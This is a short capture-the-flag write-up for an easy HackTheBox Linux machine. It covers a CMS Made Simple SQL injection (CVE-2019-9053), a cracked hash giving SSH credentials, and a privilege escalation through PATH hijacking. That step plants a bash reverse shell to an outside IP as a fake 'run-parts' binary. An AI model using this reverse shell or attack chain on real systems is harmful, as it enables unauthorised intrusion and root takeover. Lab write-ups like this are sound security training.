# Writeup - HackTheBox
## Linux - Easy

### SQLi on CMS
Use SQLi exploit to get creds (CMS Made Simple < 2.2.10 - SQL Injection, CVE 2019-9053, 46635.py in searchsploit).
Get
```python
hash = '62def4866937f08cc13bab43bb14e6f7' #md5 hash
salt = '5a599ef579066807'
```
for user jkr.

### Crack hash
Running through rockyou.txt gives the password: `raykayjay9`.
This gives the ssh creds `jkr:raykayjay9`.

### PrivEsc
Running pspy64, we see that each time there is a new ssh connection, 
```bash
sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
```
is run by root. The binary `run-parts` is in `/bin`. As a member of the group `staff`, we (jkr) can write in `/usr/local/bin`, which comes before `/bin` in the PATH. So we put a reverse shell in this folder called `run-parts`:
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.250/9001 0>&1
```
make it executable, and connect by ssh from another terminal, and we get root!
